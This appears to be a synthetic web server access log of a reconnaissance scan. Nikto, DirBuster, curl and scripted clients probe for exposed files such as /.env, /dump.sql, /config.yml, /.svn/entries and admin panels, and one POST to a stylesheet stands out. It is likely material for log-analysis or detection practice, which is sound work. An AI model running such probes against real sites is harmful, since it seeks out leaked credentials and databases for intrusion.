172.16.0.17 - - [06/May/2026:06:30:21 +0800] "GET /robots.txt HTTP/1.1" 200 508 "-" "curl/7.88.1"
172.16.0.24 - - [06/May/2026:06:13:02 +0800] "GET /wp-admin HTTP/1.1" 200 970 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/)"
172.16.0.28 - - [06/May/2026:06:12:01 +0800] "GET /dump.sql HTTP/1.1" 301 2346 "-" "Nikto/2.1.6"
172.16.0.20 - - [06/May/2026:06:36:26 +0800] "GET /api/v1/users HTTP/1.1" 403 2689 "-" "Nikto/2.1.6"
172.16.0.25 - - [06/May/2026:06:26:55 +0800] "GET /.env HTTP/1.1" 200 1222 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/)"
172.16.0.25 - - [06/May/2026:06:15:00 +0800] "GET /wp-admin HTTP/1.1" 200 1850 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/)"
172.16.0.10 - - [06/May/2026:06:36:39 +0800] "GET /phpmyadmin HTTP/1.1" 200 1216 "-" "Nikto/2.1.6"
172.16.0.14 - - [06/May/2026:06:17:31 +0800] "GET /config.yml HTTP/1.1" 301 504 "-" "Nikto/2.1.6"
172.16.0.29 - - [06/May/2026:06:26:02 +0800] "GET /wp-login.php HTTP/1.1" 403 587 "-" "python-requests/2.31.0"
172.16.0.16 - - [06/May/2026:06:19:37 +0800] "GET /.env HTTP/1.1" 403 53 "-" "Wget/1.21.3"
192.168.1.110 - - [06/May/2026:03:17:38 +0800] "POST /css/style.css HTTP/1.1" 200 35659 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
172.16.0.15 - - [06/May/2026:06:14:55 +0800] "GET /.svn/entries HTTP/1.1" 404 4237 "-" "Nikto/2.1.6"
172.16.0.29 - - [06/May/2026:06:16:12 +0800] "GET /.svn/entries HTTP/1.1" 301 3820 "-" "python-requests/2.31.0"
172.16.0.11 - - [06/May/2026:06:13:16 +0800] "GET /debug HTTP/1.1" 403 1754 "-" "Nikto/2.1.6"
172.16.0.18 - - [06/May/2026:06:13:52 +0800] "GET /mysql HTTP/1.1" 403 95 "-" "curl/7.88.1"
172.16.0.24 - - [06/May/2026:06:29:56 +0800] "GET /test HTTP/1.1" 200 3375 "-" "curl/7.88.1"
172.16.0.24 - - [06/May/2026:06:38:54 +0800] "GET /console HTTP/1.1" 403 2047 "-" "python-requests/2.31.0"
172.16.0.10 - - [06/May/2026:06:10:43 +0800] "GET /test HTTP/1.1" 500 2472 "-" "curl/7.88.1"
